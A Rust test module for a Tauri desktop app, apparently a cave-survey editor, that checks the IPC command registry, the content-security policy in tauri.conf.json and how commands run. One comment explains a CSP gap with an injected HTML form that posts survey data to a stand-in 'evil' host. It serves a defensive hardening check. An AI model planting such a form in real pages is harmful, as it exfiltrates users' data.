//! App-surface contract tests relocated next to the wiring they pin, ahead of
//! the crate split: the IPC command registry (`generate_handler![]` in
//! `lib.rs`, read through its generated manifest) and `tauri.conf.json` stay
//! with the app crate, so the tests that read them live here too.

/// Every command `generate_handler![]` registers, from the manifest
/// `pnpm gen:ipc-types` writes (#576 C3) - parsed out of `lib.rs` with `syn`
/// and kept fresh by CI's generated-types gate - instead of a text scan of
/// `lib.rs` here.
fn registered_commands() -> Vec<String> {
    let manifest: serde_json::Value =
        serde_json::from_str(include_str!("../../../src/types/ipc/ipcCommands.json"))
            .expect("ipcCommands.json is the generator's JSON");
    let names: Vec<String> = manifest["commands"]
        .as_array()
        .expect("the manifest lists commands")
        .iter()
        .map(|c| {
            c["name"]
                .as_str()
                .expect("every command has a name")
                .to_owned()
        })
        .collect();
    assert!(
        names.len() > 100,
        "the manifest lists only {} commands",
        names.len()
    );
    names
}

#[test]
fn the_legacy_open_project_is_not_exposed_over_ipc() {
    // `AppState::open_project` deliberately has NO canonical-storage guard
    // (see its doc comment): its one production caller reopens the canonical
    // cache path after a failed replace. That is only sound while the webview
    // cannot reach it, so pin its absence from the command registry.
    assert!(
        !registered_commands()
            .iter()
            .any(|name| name == "open_project"),
        "open_project gained an IPC registration - it must now run the \
         canonical-storage guard (see AppState::open_project's doc comment)"
    );
}

/// `connect-src` in BOTH policies must admit Tauri's own IPC origin.
///
/// [#576 A8] Not a source scan: it reads the shipped `tauri.conf.json` - the
/// artefact itself, which no other test exercises - not Rust source text.
///
/// Every `invoke` is a `fetch` to `ipc://localhost/<cmd>` (macOS/Linux) or
/// `http://ipc.localhost/<cmd>` (Windows) - see `ipc-protocol.js` in the `tauri`
/// crate - so `connect-src` governs it, and Tauri does NOT add the origin back:
/// `set_csp` merges only script/style hashes, and its one automatic `default-src`
/// addition is gated on the isolation pattern, which this app does not use.
///
/// Omitting it does not brick the app, which is exactly why this needs a test:
/// the failure is silent. Tauri catches the CSP rejection, warns once to a
/// console nobody reads in a packaged build, latches `customProtocolIpcFailed`
/// and falls back to `postMessage` for the rest of the session - losing the
/// binary response path for every IPC reply. Nothing else in this repo can catch
/// it: `tauri.conf.json` has no linter, and the production `csp` (as opposed to
/// `devCsp`) is not exercised by the dev server, Playwright, or vitest - only by
/// a real `tauri build`.
#[test]
fn test_csp_allows_the_tauri_ipc_origin() {
    let conf_path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tauri.conf.json");
    let conf: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&conf_path).unwrap()).unwrap();

    let security = &conf["app"]["security"];
    for key in ["csp", "devCsp"] {
        // `assert!` rather than `unwrap_or_else(|| panic!(..))`: `clippy::panic`
        // is deny-level here, and this module's `#[expect]` (commands/mod.rs)
        // covers `unwrap`/`expect` but deliberately not `panic!`.
        let policy = security[key].as_str();
        assert!(policy.is_some(), "app.security.{key} must be a string");
        let policy = policy.unwrap();

        let connect_src = policy
            .split(';')
            .map(str::trim)
            .find(|directive| directive.starts_with("connect-src"));
        assert!(connect_src.is_some(), "{key} must declare connect-src");
        let connect_src = connect_src.unwrap();

        for origin in ["ipc:", "http://ipc.localhost"] {
            assert!(
                connect_src.split_whitespace().any(|src| src == origin),
                "{key}'s connect-src must list `{origin}` or every invoke falls \
                 back to the slower postMessage transport; got: {connect_src}"
            );
        }

        // `form-action` and `frame-ancestors` have NO `default-src` fallback in
        // CSP3, so a tight `connect-src` is not the exfil control it looks like:
        // an injected `<form method=POST action=https://evil/>` posts survey data
        // straight past it. Neither directive can break a Tauri app, so there is
        // no reason for either to be absent.
        for directive in ["form-action 'none'", "frame-ancestors 'none'"] {
            assert!(
                policy.split(';').map(str::trim).any(|d| d == directive),
                "{key} must declare `{directive}` - it does not fall back to \
                 default-src; got: {policy}"
            );
        }
    }
}

/// [#576 C2] Commands that may run on the main thread, each with its reason.
/// Tauri runs a non-`async` command inline in the IPC handler on the main
/// thread, freezing the window and queueing every later call - Cancel included -
/// behind it, so the list is empty and adding to it needs a reason that outweighs
/// that (docs/architecture.md, "Where commands run").
const MAIN_THREAD_COMMANDS: &[(&str, &str)] = &[];

#[test]
fn every_registered_command_runs_off_the_main_thread() {
    let manifest: serde_json::Value =
        serde_json::from_str(include_str!("../../../src/types/ipc/ipcCommands.json"))
            .expect("the generated command manifest parses");
    let commands = manifest["commands"]
        .as_array()
        .expect("the manifest lists its commands");
    assert!(
        commands.len() > 150,
        "premise: the manifest lists every registered command, got {}",
        commands.len()
    );
    let on_main_thread: Vec<&str> = commands
        .iter()
        .filter(|c| c["async"] != serde_json::Value::Bool(true))
        .filter_map(|c| c["name"].as_str())
        .filter(|name| {
            !MAIN_THREAD_COMMANDS
                .iter()
                .any(|(allowed, _)| allowed == name)
        })
        .collect();
    assert!(
        on_main_thread.is_empty(),
        "these commands run on the main thread; make them `async` and put the body on \
         the blocking pool (`commands::pool`), or list them in MAIN_THREAD_COMMANDS with a \
         reason: {on_main_thread:?}"
    );
}

/// [#576 D22] The success values that carry the SpeleoDB link bits: every type
/// the core's `carries_remote_link!` invocation implements `MutationOutcome` for,
/// read off that source, so a new one is covered without editing a list here.
fn mutation_outcome_types() -> Vec<String> {
    let src = include_str!("../../crates/core/src/core/outcome.rs");
    let start = src
        .find("carries_remote_link!(")
        .expect("the MutationOutcome impl list is present");
    let list = &src[start + "carries_remote_link!(".len()..];
    let list = &list[..list.find(");").expect("the impl list terminates")];
    list.split(',')
        .map(str::trim)
        .filter(|ty| !ty.is_empty())
        .map(|ty| ty.rsplit("::").next().unwrap_or(ty).to_owned())
        .collect()
}

/// `text` from its first `{` to the matching `}`, skipping string literals and
/// line comments (a `{` inside `"{e}"` is not a brace). `None` when it never
/// closes.
fn braced_block(text: &str) -> Option<&str> {
    let open = text.find('{')?;
    let bytes = text.as_bytes();
    let (mut depth, mut i) = (0usize, open);
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                i += 1;
                while i < bytes.len() && bytes[i] != b'"' {
                    i += if bytes[i] == b'\\' { 2 } else { 1 };
                }
            }
            b'/' if bytes.get(i + 1) == Some(&b'/') => {
                while i < bytes.len() && bytes[i] != b'\n' {
                    i += 1;
                }
            }
            b'{' => depth += 1,
            b'}' => {
                depth -= 1;
                if depth == 0 {
                    return Some(&text[open..=i]);
                }
            }
            _ => {}
        }
        i += 1;
    }
    None
}

/// The `X` of a `Result<X, CommandError>` return type (its last path segment), or
/// `None` for any other return type.
fn ok_type_of_command_result(ret: &str) -> Option<String> {
    let inner = ret.trim().strip_prefix("Result<")?;
    let mut depth = 0i32;
    let comma = inner.char_indices().find_map(|(at, c)| {
        match c {
            '<' | '(' => depth += 1,
            '>' | ')' => depth -= 1,
            ',' if depth == 0 => return Some(at),
            _ => {}
        }
        None
    })?;
    let error = inner[comma + 1..].trim_start();
    if !(error.starts_with("CommandError>") || error.contains("::CommandError>")) {
        return None;
    }
    let ok = inner[..comma].trim();
    Some(ok.rsplit("::").next().unwrap_or(ok).to_owned())
}

/// [#576 D22] `pool::run_mutation` is the ONE writer of an answer's `remote_link`,
/// so every command answering a `MutationOutcome` must run through it: one that
/// answers through `pool::run` (or anything else) leaves `remote_link` at the
/// `null` its outcome is built with, and the frontend - which applies the bits in
/// one place and keeps no mirror - never learns the edit dirtied the copy. A
/// source scan of every `#[tauri::command]` in `src/commands/*.rs`, cross-checked
/// against the generated command manifest so it cannot pass by seeing nothing.
///
/// A sanctioned site inventory (#576 A8-D2, docs/testing-recipes.md "Source
/// scans"): "every command whose answer is a `MutationOutcome` routes through
/// `run_mutation`" is a rule over the bodies `#[tauri::command]` wraps, and no type
/// can state it - `pool::run` accepts any `Result<T, CommandError>`, and Rust has no
/// negative bound to refuse a `MutationOutcome` there without a marker on every
/// other reply type. Each file is cut at its trailing test region by the shared
/// helper (`models::source_scan::test_module_start`), not by splitting on the bare
/// attribute text.
#[test]
fn every_mutation_outcome_command_runs_through_run_mutation() {
    let outcomes = mutation_outcome_types();
    for known in [
        "EditOutcome",
        "SectionCreated",
        "ShotCreated",
        "ReverseOutcome",
        "BatchOutcome",
        "HistoryOutcome",
        "ImportOutcome",
        "IntegrityRepairResult",
    ] {
        assert!(
            outcomes.iter().any(|ty| ty == known),
            "premise: `{known}` carries the link bits; parsed {outcomes:?}"
        );
    }

    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src/commands");
    let mut files: Vec<std::path::PathBuf> = std::fs::read_dir(&dir)
        .expect("the commands dir reads")
        .map(|entry| entry.expect("a dir entry").path())
        .filter(|path| {
            path.extension().is_some_and(|ext| ext == "rs")
                && !path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .is_some_and(|n| n.ends_with("_tests.rs"))
        })
        .collect();
    files.sort();
    let mut scanned: Vec<String> = Vec::new();
    let mut offenders: Vec<String> = Vec::new();
    for path in files {
        let text = std::fs::read_to_string(&path).expect("a command file reads");
        // Production only: a file's own trailing test region ends it.
        let prod = text
            .get(..crate::models::source_scan::test_module_start(&text).unwrap_or(text.len()))
            .unwrap_or(&text);
        let file = path.file_name().and_then(|n| n.to_str()).unwrap_or("?");
        for chunk in prod.split("#[tauri::command]").skip(1) {
            let after = &chunk[chunk.find("fn ").expect("a command is a fn") + 3..];
            let name: String = after
                .chars()
                .take_while(|c| c.is_alphanumeric() || *c == '_')
                .collect();
            let signature = &after[..after.find('{').expect("a command has a body")];
            let ret = signature.rsplit("->").next().unwrap_or_default();
            let Some(ok) = ok_type_of_command_result(ret) else {
                continue;
            };
            if !outcomes.contains(&ok) {
                continue;
            }
            scanned.push(name.clone());
            let body = braced_block(after).expect("the command's body closes");
            if !body.contains("pool::run_mutation(") {
                offenders.push(format!("{file}::{name} -> Result<{ok}, CommandError>"));
            }
        }
    }
    scanned.sort();

    // The manifest's view of the same set: the scan must have seen every command
    // whose answer is a MutationOutcome, or a parse slip would pass vacuously.
    let manifest: serde_json::Value =
        serde_json::from_str(include_str!("../../../src/types/ipc/ipcCommands.json"))
            .expect("the generated command manifest parses");
    let mut expected: Vec<String> = manifest["commands"]
        .as_array()
        .expect("the manifest lists its commands")
        .iter()
        .filter(|c| {
            c["result"]["rust"]
                .as_str()
                .is_some_and(|ty| outcomes.iter().any(|o| o == ty))
        })
        .filter_map(|c| c["name"].as_str().map(str::to_owned))
        .collect();
    expected.sort();
    assert!(
        scanned.len() >= 40,
        "premise: the scan finds the survey mutations, got {}: {scanned:?}",
        scanned.len()
    );
    assert_eq!(
        scanned, expected,
        "RULE (every MutationOutcome command runs through run_mutation, #576 D22): the \
         source scan and the generated manifest disagree on which commands answer a \
         MutationOutcome"
    );
    assert!(
        offenders.is_empty(),
        "RULE (every MutationOutcome command runs through run_mutation, #576 D22): these \
         {} of {} commands answer a MutationOutcome but do not run through \
         `pool::run_mutation`, so their answer never carries the SpeleoDB link bits: \
         {offenders:?}",
        offenders.len(),
        scanned.len()
    );
}
